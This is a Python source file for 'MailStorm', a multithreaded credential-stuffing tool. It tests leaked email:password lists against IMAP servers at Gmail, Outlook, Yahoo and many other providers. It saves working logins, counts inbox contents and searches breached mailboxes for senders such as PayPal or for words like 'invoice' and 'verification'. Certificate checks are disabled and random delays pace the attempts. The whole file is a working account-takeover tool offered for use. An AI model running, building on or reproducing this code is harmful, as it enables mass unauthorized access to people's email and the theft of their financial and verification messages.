import imaplib
import threading
import os
import time
import ssl
import re
from datetime import datetime, timedelta
from queue import Queue, Empty
from colorama import Fore, init
import questionary
from tkinter import filedialog, Tk
import random
import ctypes

init(autoreset=True)

class MailStorm:
    def __init__(self):
        self.hits = 0
        self.invalids = 0
        self.total_checked = 0
        self.errors = 0
        self.no_server = 0
        self.custom_hits = 0  # New counter for keyword matches
        self.start_time = time.time()
        self.total_combos = 0
        self.lock = threading.Lock()
        self.running = True
        self.search_term = None
        self.search_type = None
        self.search_enabled = False
        self.results = {'hits': [], 'invalids': [], 'errors': []}
        self.domains = self.load_domains()
        
        # Create Results folder structure with date/time
        self.session_folder = self.create_session_folder()
        
        self.output_files = {
            'hits_clean': os.path.join(self.session_folder, 'hits.txt'),
            'hits_full': os.path.join(self.session_folder, 'hits_full.txt'),
            'hits_detailed': os.path.join(self.session_folder, 'hits_detailed.txt'),
            'keyword_results': os.path.join(self.session_folder, 'keyword_results.txt')
        }
        
        for file_path in self.output_files.values():
            with open(file_path, 'w', encoding='utf-8') as f:
                f.write('')
    
    def create_session_folder(self):
        """Create a timestamped folder for this session's results"""
        # Create main Results folder if it doesn't exist
        results_dir = 'Results'
        if not os.path.exists(results_dir):
            os.makedirs(results_dir)
        
        # Create session folder with timestamp
        timestamp = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
        session_folder = os.path.join(results_dir, timestamp)
        os.makedirs(session_folder)
        
        return session_folder
    
    def set_console_title(self, title):
        """Set the console window title"""
        try:
            ctypes.windll.kernel32.SetConsoleTitleW(title)
        except:
            # Fallback for non-Windows systems
            print(f'\33]0;{title}\a', end='', flush=True)
    
    def load_domains(self):
        domains = {
            'gmail.com': [{'server': 'imap.gmail.com', 'port': 993, 'ssl': True}],
            'googlemail.com': [{'server': 'imap.gmail.com', 'port': 993, 'ssl': True}],
            'outlook.com': [{'server': 'outlook.office365.com', 'port': 993, 'ssl': True}],
            'hotmail.com': [{'server': 'outlook.office365.com', 'port': 993, 'ssl': True}],
            'live.com': [{'server': 'outlook.office365.com', 'port': 993, 'ssl': True}],
            'msn.com': [{'server': 'outlook.office365.com', 'port': 993, 'ssl': True}],
            'yahoo.com': [{'server': 'imap.mail.yahoo.com', 'port': 993, 'ssl': True}],
            'yahoo.de': [{'server': 'imap.mail.yahoo.com', 'port': 993, 'ssl': True}],
            'yahoo.co.uk': [{'server': 'imap.mail.yahoo.com', 'port': 993, 'ssl': True}],
            'yahoo.fr': [{'server': 'imap.mail.yahoo.com', 'port': 993, 'ssl': True}],
            'yahoo.it': [{'server': 'imap.mail.yahoo.com', 'port': 993, 'ssl': True}],
            'ymail.com': [{'server': 'imap.mail.yahoo.com', 'port': 993, 'ssl': True}],
            'gmx.de': [{'server': 'imap.gmx.net', 'port': 993, 'ssl': True}],
            'gmx.com': [{'server': 'imap.gmx.com', 'port': 993, 'ssl': True}],
            'gmx.at': [{'server': 'imap.gmx.at', 'port': 993, 'ssl': True}],
            'web.de': [{'server': 'imap.web.de', 'port': 993, 'ssl': True}],
            't-online.de': [{'server': 'secureimap.t-online.de', 'port': 993, 'ssl': True}],
            '1und1.de': [{'server': 'imap.1und1.de', 'port': 993, 'ssl': True}],
            'freenet.de': [{'server': 'mx.freenet.de', 'port': 993, 'ssl': True}],
            'arcor.de': [{'server': 'imap.arcor.de', 'port': 993, 'ssl': True}],
            'libero.it': [{'server': 'imapmail.libero.it', 'port': 993, 'ssl': True}],
            'virgilio.it': [{'server': 'box.virgilio.it', 'port': 993, 'ssl': True}],
            'alice.it': [{'server': 'in.alice.it', 'port': 993, 'ssl': True}],
            'tin.it': [{'server': 'box.tin.it', 'port': 993, 'ssl': True}],
            'tiscali.it': [{'server': 'imapmail.tiscali.it', 'port': 993, 'ssl': True}],
            'poste.it': [{'server': 'imaps.poste.it', 'port': 993, 'ssl': True}],
            'orange.fr': [{'server': 'imap.orange.fr', 'port': 993, 'ssl': True}],
            'free.fr': [{'server': 'imap.free.fr', 'port': 993, 'ssl': True}],
            'wanadoo.fr': [{'server': 'imap.orange.fr', 'port': 993, 'ssl': True}],
            'sfr.fr': [{'server': 'imap.sfr.fr', 'port': 993, 'ssl': True}],
            'laposte.net': [{'server': 'imap.laposte.net', 'port': 993, 'ssl': True}],
            'aol.com': [{'server': 'imap.aol.com', 'port': 993, 'ssl': True}],
            'icloud.com': [{'server': 'imap.mail.me.com', 'port': 993, 'ssl': True}],
            'me.com': [{'server': 'imap.mail.me.com', 'port': 993, 'ssl': True}],
            'yandex.com': [{'server': 'imap.yandex.com', 'port': 993, 'ssl': True}],
            'yandex.ru': [{'server': 'imap.yandex.ru', 'port': 993, 'ssl': True}],
            'mail.ru': [{'server': 'imap.mail.ru', 'port': 993, 'ssl': True}],
            'zoho.com': [{'server': 'imap.zoho.com', 'port': 993, 'ssl': True}],
            'protonmail.com': [{'server': 'imap.protonmail.com', 'port': 993, 'ssl': True}]
        }
        
        if os.path.exists('domains.txt'):
            try:
                with open('domains.txt', 'r', encoding='utf-8') as f:
                    for line in f:
                        line = line.strip()
                        if '|' in line and not line.startswith('#'):
                            parts = line.split('|')
                            if len(parts) >= 2:
                                domain = parts[0].strip()
                                server = parts[1].strip()
                                port = int(parts[2]) if len(parts) > 2 and parts[2].strip().isdigit() else 993
                                ssl_enabled = parts[3].lower() == 'true' if len(parts) > 3 else True
                                
                                if domain not in domains:
                                    domains[domain] = [{
                                        'server': server,
                                        'port': port,
                                        'ssl': ssl_enabled
                                    }]
            except:
                pass
        
        return domains
    
    def create_ssl_context(self):
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        context.set_ciphers('DEFAULT@SECLEVEL=1')
        context.minimum_version = ssl.TLSVersion.TLSv1
        return context
    
    def create_connection(self, config, timeout=12):
        try:
            if config['ssl']:
                context = self.create_ssl_context()
                mail = imaplib.IMAP4_SSL(
                    config['server'],
                    config['port'],
                    timeout=timeout,
                    ssl_context=context
                )
            else:
                mail = imaplib.IMAP4(config['server'], config['port'], timeout=timeout)
                mail.starttls(ssl_context=self.create_ssl_context())
            
            return mail
        except:
            return None
    
    def perform_search(self, mail, search_term, search_type):
        search_results = {'total_found': 0, 'recent_count': 0}
        
        try:
            mail.select('INBOX')
            
            if search_type == 'sender':
                patterns = [
                    f'FROM "{search_term}"',
                    f'FROM {search_term}',
                    f'HEADER FROM {search_term}'
                ]
                
                max_count = 0
                for pattern in patterns:
                    try:
                        status, data = mail.search(None, pattern)
                        if status == 'OK' and data[0]:
                            count = len(data[0].split())
                            max_count = max(max_count, count)
                    except:
                        continue
                
                search_results['total_found'] = max_count
                
            elif search_type == 'keyword':
                search_locations = [
                    f'SUBJECT "{search_term}"',
                    f'BODY "{search_term}"'
                ]
                
                total_ids = set()
                for location in search_locations:
                    try:
                        status, data = mail.search(None, location)
                        if status == 'OK' and data[0]:
                            ids = data[0].split()
                            total_ids.update(ids)
                    except:
                        continue
                
                search_results['total_found'] = len(total_ids)
            
            try:
                since_date = (datetime.now() - timedelta(days=30)).strftime('%d-%b-%Y')
                if search_type == 'sender':
                    status, data = mail.search(None, f'FROM {search_term} SINCE {since_date}')
                else:
                    status, data = mail.search(None, f'TEXT "{search_term}" SINCE {since_date}')
                
                if status == 'OK' and data[0]:
                    search_results['recent_count'] = len(data[0].split())
            except:
                pass
                
        except:
            pass
        
        return search_results
    
    def get_account_info(self, mail):
        info = {}
        
        try:
            mail.select('INBOX')
            
            status, messages = mail.search(None, 'ALL')
            if status == 'OK':
                info['total_emails'] = len(messages[0].split()) if messages[0] else 0
            
            status, unread = mail.search(None, 'UNSEEN')
            if status == 'OK':
                info['unread_emails'] = len(unread[0].split()) if unread[0] else 0
            
            try:
                if messages[0]:
                    email_ids = messages[0].split()
                    if email_ids:
                        latest_id = email_ids[-1]
                        status, msg_data = mail.fetch(latest_id, '(INTERNALDATE)')
                        if status == 'OK' and msg_data[0]:
                            date_str = msg_data[0].decode()
                            date_match = re.search(r'INTERNALDATE "([^"]+)"', date_str)
                            if date_match:
                                date_part = date_match.group(1)
                                try:
                                    from email.utils import parsedate_to_datetime
                                    parsed_date = parsedate_to_datetime(date_part)
                                    info['last_email'] = parsed_date.strftime('%Y-%m-%d')
                                except:
                                    info['last_email'] = date_part[:10]
            except:
                pass
                
        except:
            pass
        
        return info
    
    def check_single_account(self, email, password):
        result = {
            'email': email,
            'password': password,
            'status': 'unknown',
            'error': None,
            'server_used': None,
            'search_results': {},
            'account_info': {}
        }
        
        domain = email.split('@')[-1].lower()
        
        try:
            configs = self.domains.get(domain, [])
            if not configs:
                result['status'] = 'no_server'
                result['error'] = f'No IMAP server found for domain: {domain}'
                return result
            
            for config in configs:
                try:
                    mail = self.create_connection(config)
                    if not mail:
                        continue
                    
                    try:
                        mail.login(email, password)
                        result['status'] = 'valid'
                        result['server_used'] = f"{config['server']}:{config['port']}"
                        
                        try:
                            result['account_info'] = self.get_account_info(mail)
                        except:
                            pass
                        
                        if self.search_enabled and self.search_term and self.search_type:
                            try:
                                result['search_results'] = self.perform_search(
                                    mail, self.search_term, self.search_type
                                )
                            except:
                                pass
                        
                        try:
                            mail.logout()
                        except:
                            pass
                        
                        return result
                        
                    except imaplib.IMAP4.error as login_error:
                        error_str = str(login_error).lower()
                        
                        if any(phrase in error_str for phrase in [
                            'authentication failed', 'invalid credentials', 'login failed',
                            'auth', 'password', 'username', 'credential'
                        ]):
                            result['status'] = 'invalid'
                            result['error'] = 'Authentication failed'
                            result['server_used'] = f"{config['server']}:{config['port']}"
                        else:
                            result['status'] = 'error'
                            result['error'] = str(login_error)
                        
                        try:
                            mail.logout()
                        except:
                            pass
                        
                        if result['status'] == 'invalid':
                            return result
                            
                    except Exception:
                        try:
                            mail.logout()
                        except:
                            pass
                        continue
                        
                except Exception:
                    continue
            
            if result['status'] == 'unknown':
                result['status'] = 'error'
                result['error'] = 'All IMAP configurations failed'
                
        except Exception as e:
            result['status'] = 'error'
            result['error'] = str(e)
        
        return result
    
    def save_hit_clean(self, result):
        try:
            with open(self.output_files['hits_clean'], 'a', encoding='utf-8') as f:
                f.write(f"{result['email']}:{result['password']}\n")
        except:
            pass
    
    def save_hit_full(self, result):
        try:
            with open(self.output_files['hits_full'], 'a', encoding='utf-8') as f:
                line = f"{result['email']}:{result['password']}"
                
                search_results = result.get('search_results', {})
                if search_results.get('total_found', 0) > 0:
                    line += f" | {self.search_type}:{self.search_term}({search_results['total_found']})"
                    if search_results.get('recent_count', 0) > 0:
                        line += f" | recent({search_results['recent_count']})"
                
                account_info = result.get('account_info', {})
                if account_info.get('total_emails'):
                    line += f" | total({account_info['total_emails']})"
                if account_info.get('unread_emails'):
                    line += f" | unread({account_info['unread_emails']})"
                if account_info.get('last_email'):
                    line += f" | last:{account_info['last_email']}"
                
                f.write(line + '\n')
        except:
            pass
    
    def save_hit_detailed(self, result):
        try:
            with open(self.output_files['hits_detailed'], 'a', encoding='utf-8') as f:
                line = f"{result['email']}:{result['password']}"
                line += f" | Server: {result.get('server_used', 'unknown')}"
                
                account_info = result.get('account_info', {})
                if account_info.get('total_emails'):
                    line += f" | Emails: {account_info['total_emails']}"
                if account_info.get('unread_emails'):
                    line += f" | Unread: {account_info['unread_emails']}"
                if account_info.get('last_email'):
                    line += f" | LastEmail: {account_info['last_email']}"
                
                search_results = result.get('search_results', {})
                if search_results.get('total_found', 0) > 0:
                    line += f" | SearchHits: {search_results['total_found']}"
                
                f.write(line + '\n')
        except:
            pass
    
    def save_keyword_results(self, result):
        if not self.search_enabled or not result.get('search_results', {}).get('total_found', 0) > 0:
            return
            
        try:
            with open(self.output_files['keyword_results'], 'a', encoding='utf-8') as f:
                search_results = result['search_results']
                account_info = result.get('account_info', {})
                
                line = f"{result['email']}:{result['password']}"
                line += f" | {self.search_type}:{self.search_term}({search_results['total_found']})"
                
                if search_results.get('recent_count', 0) > 0:
                    line += f" | recent({search_results['recent_count']})"
                
                if account_info.get('last_email'):
                    line += f" | last:{account_info['last_email']}"
                
                if account_info.get('total_emails'):
                    line += f" | total({account_info['total_emails']})"
                
                f.write(line + '\n')
        except:
            pass
    
    def worker_thread(self, work_queue):
        while self.running:
            try:
                item = work_queue.get(timeout=1)
                if item is None:
                    break
                
                email, password = item
                
                time.sleep(random.uniform(0.05, 0.15))
                
                result = self.check_single_account(email, password)
                
                with self.lock:
                    self.total_checked += 1
                    
                    if result['status'] == 'valid':
                        self.hits += 1
                        self.results['hits'].append(result)
                        
                        self.save_hit_clean(result)
                        self.save_hit_full(result)
                        self.save_hit_detailed(result)
                        
                        # Check if this hit has keyword matches
                        has_keyword_match = result.get('search_results', {}).get('total_found', 0) > 0
                        
                        if self.search_enabled:
                            self.save_keyword_results(result)
                            if has_keyword_match:
                                self.custom_hits += 1
                        
                        # Display hit information
                        hit_msg = f"{Fore.GREEN}[HIT] {Fore.WHITE}{email}:{password}"
                        
                        account_info = result.get('account_info', {})
                        if account_info.get('total_emails'):
                            hit_msg += f" {Fore.CYAN}| Emails: {account_info['total_emails']}"
                        if account_info.get('unread_emails'):
                            hit_msg += f" {Fore.YELLOW}| Unread: {account_info['unread_emails']}"
                        
                        if has_keyword_match:
                            search_count = result['search_results']['total_found']
                            hit_msg += f" {Fore.MAGENTA}| {self.search_type.upper()}: {search_count} matches"
                        
                        print(hit_msg)
                        
                    elif result['status'] == 'invalid':
                        self.invalids += 1
                        self.results['invalids'].append(result)
                        
                    elif result['status'] == 'no_server':
                        self.no_server += 1
                        
                    else:
                        self.errors += 1
                        self.results['errors'].append(result)
                
                work_queue.task_done()
                
            except Empty:
                continue
            except:
                continue
    
    def display_progress(self):
        """Display progress in console title"""
        while self.running:
            try:
                elapsed = time.time() - self.start_time
                cpm = (self.total_checked / elapsed * 60) if elapsed > 0 else 0
                hit_rate = (self.hits / self.total_checked * 100) if self.total_checked > 0 else 0
                
                eta_seconds = 0
                if self.total_combos > 0 and cpm > 0:
                    remaining = self.total_combos - self.total_checked
                    eta_seconds = (remaining / cpm) * 60
                    eta_minutes = int(eta_seconds // 60)
                else:
                    eta_minutes = 0
                
                # Build title string
                title_parts = [
                    f"Hits: {self.hits}",
                    f"Invalid: {self.invalids}",
                    f"Errors: {self.errors}",
                    f"NoSrv: {self.no_server}"
                ]
                
                if self.search_enabled:
                    title_parts.append(f"Custom: {self.custom_hits}")
                
                title_parts.extend([
                    f"CPM: {cpm:.1f}",
                    f"Hit%: {hit_rate:.1f}%",
                    f"Time: {elapsed:.0f}s"
                ])
                
                if eta_minutes > 0:
                    title_parts.append(f"ETA: {eta_minutes}m")
                
                title = " | ".join(title_parts)
                self.set_console_title(f"MailStorm - {title}")
                
                time.sleep(1)
                
            except:
                continue
    
    def load_combos(self, filename):
        combos = []
        encodings = ['utf-8', 'latin-1', 'cp1252', 'iso-8859-1']
        
        for encoding in encodings:
            try:
                with open(filename, 'r', encoding=encoding, errors='ignore') as f:
                    for line in f:
                        line = line.strip()
                        if not line or line.startswith('#'):
                            continue
                        
                        line = re.sub(r'[^\x20-\x7E]', '', line)
                        
                        if ':' in line and '@' in line:
                            parts = line.split(':', 1)
                        elif '|' in line and '@' in line:
                            parts = line.split('|', 1)
                        else:
                            continue
                        
                        if len(parts) == 2:
                            email_part = parts[0].strip()
                            password_part = parts[1].strip()
                            
                            email_pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
                            if re.match(email_pattern, email_part) and password_part:
                                combos.append((email_part, password_part))
                
                if combos:
                    print(f"{Fore.GREEN}Loaded {len(combos)} combos using {encoding} encoding")
                    return combos
                    
            except:
                continue
        
        return combos
    
    def run_checker(self, combo_file, num_threads=30):
        print(f"{Fore.YELLOW}Starting MailStorm ...\n")
        
        combos = self.load_combos(combo_file)
        if not combos:
            print(f"{Fore.RED}No valid combos found!")
            return
        
        self.total_combos = len(combos)
        print(f"{Fore.GREEN}Loaded {len(combos)} email combinations")
        
        if self.search_enabled:
            print(f"{Fore.YELLOW}Search enabled: {self.search_type} = '{self.search_term}'")
        
        work_queue = Queue()
        for combo in combos:
            work_queue.put(combo)
        
        threads = []
        for i in range(num_threads):
            t = threading.Thread(target=self.worker_thread, args=(work_queue,))
            t.daemon = True
            t.start()
            threads.append(t)
        
        print(f"{Fore.GREEN}Started {len(threads)} worker threads\n")
        
        progress_thread = threading.Thread(target=self.display_progress)
        progress_thread.daemon = True
        progress_thread.start()
        
        print(f"{Fore.CYAN}{'='*80}")
        print(f"{Fore.CYAN}CHECKING STARTED - Watch title bar for progress")
        print(f"{Fore.CYAN}{'='*80}\n")
        
        try:
            work_queue.join()
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}Stopping checker...")
            self.running = False
        
        self.running = False
        
        for _ in range(num_threads):
            work_queue.put(None)
        
        for t in threads:
            t.join(timeout=2)
        
        self.display_final_results()
    
    def display_final_results(self):
        print(f"\n\n{Fore.GREEN}{'='*80}")
        print(f"{Fore.GREEN}FINAL RESULTS")
        print(f"{Fore.GREEN}{'='*80}")
        
        print(f"{Fore.GREEN}Total Hits: {self.hits}")
        if self.search_enabled:
            print(f"{Fore.MAGENTA}Custom Hits (with keywords): {self.custom_hits}")
        print(f"{Fore.RED}Total Invalid: {self.invalids}")
        print(f"{Fore.YELLOW}Total Errors: {self.errors}")
        print(f"{Fore.BLUE}No Server Found: {self.no_server}")
        print(f"{Fore.CYAN}Total Checked: {self.total_checked}")
        
        if self.total_checked > 0:
            hit_rate = (self.hits / self.total_checked) * 100
            print(f"{Fore.MAGENTA}Hit Rate: {hit_rate:.2f}%")
            
            if self.search_enabled and self.hits > 0:
                custom_rate = (self.custom_hits / self.hits) * 100
                print(f"{Fore.MAGENTA}Custom Rate: {custom_rate:.2f}% of hits")
        
        if self.hits > 0:
            print(f"\n{Fore.CYAN}Output Files:")
            print(f"   {Fore.WHITE}Clean Hits: {Fore.YELLOW}{self.output_files['hits_clean']}")
            print(f"   {Fore.WHITE}Full Results: {Fore.YELLOW}{self.output_files['hits_full']}")
            print(f"   {Fore.WHITE}Detailed Info: {Fore.YELLOW}{self.output_files['hits_detailed']}")
            
            if self.search_enabled:
                try:
                    with open(self.output_files['keyword_results'], 'r', encoding='utf-8') as f:
                        keyword_lines = len(f.readlines())
                    if keyword_lines > 0:
                        print(f"   {Fore.WHITE}Keyword Results: {Fore.YELLOW}{self.output_files['keyword_results']} {Fore.GREEN}({keyword_lines} results)")
                except:
                    pass
        
        print(f"{Fore.GREEN}{'='*80}\n")


def main():
    print(f"{Fore.CYAN}{'='*80}")
    print(f"{Fore.CYAN}MAILSTORM - EMAIL CHECKER")
    print(f"{Fore.CYAN}{'='*80}")
    print(f"{Fore.YELLOW}Enhanced display with live hit tracking and title bar progress")
    print()
    
    checker = MailStorm()
    
    try:
        threads_input = questionary.text(
            "Number of threads (default: 30):",
            default="30"
        ).ask()
        num_threads = int(threads_input) if threads_input else 30
        
        print(f"\n{Fore.CYAN}Select combo file...")
        root = Tk()
        root.withdraw()
        combo_file = filedialog.askopenfilename(
            title="Select Combo File (email:password)",
            filetypes=[("Text files", "*.txt"), ("All files", "*.*")]
        )
        root.destroy()
        
        if not combo_file:
            print(f"{Fore.RED}No file selected!")
            return
        
        print(f"{Fore.GREEN}Selected: {os.path.basename(combo_file)}")
        
        print(f"\n{Fore.MAGENTA}Search Configuration")
        enable_search = questionary.confirm("Enable search features?", default=False).ask()
        
        if enable_search:
            checker.search_enabled = True
            
            search_type = questionary.select(
                "Search type:",
                choices=[
                    {"name": "Sender Search (e.g., paypal.com)", "value": "sender"},
                    {"name": "Keyword Search (e.g., invoice)", "value": "keyword"}
                ]
            ).ask()
            
            checker.search_type = search_type
            
            if search_type == "sender":
                search_term = questionary.text(
                    "Enter sender to search for:",
                    instruction="Examples: paypal.com, noreply@amazon.com"
                ).ask()
            else:
                search_term = questionary.text(
                    "Enter keyword to search for:",
                    instruction="Examples: invoice, payment, verification"
                ).ask()
            
            if search_term:
                checker.search_term = search_term
                print(f"{Fore.GREEN}Search configured: {search_type} = '{search_term}'")
            else:
                checker.search_enabled = False
                print(f"{Fore.YELLOW}No search term provided. Search disabled.")
        
        print(f"\n{Fore.YELLOW}Configuration Summary:")
        print(f"   Threads: {num_threads}")
        print(f"   File: {os.path.basename(combo_file)}")
        print(f"   Search: {'Yes' if checker.search_enabled else 'No'}")
        if checker.search_enabled:
            print(f"   Search Type: {checker.search_type}")
            print(f"   Search Term: {checker.search_term}")
        
        start_confirmed = questionary.confirm("\nStart checking?", default=True).ask()
        if not start_confirmed:
            print(f"{Fore.YELLOW}Cancelled by user")
            return
        
        checker.run_checker(combo_file, num_threads)
        
        print(f"\n{Fore.GREEN}Checker completed successfully!")
        
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}Checker stopped by user")
    except ValueError:
        print(f"{Fore.RED}Invalid number of threads!")
    except Exception as e:
        print(f"{Fore.RED}Error: {e}")


if __name__ == "__main__":
    main()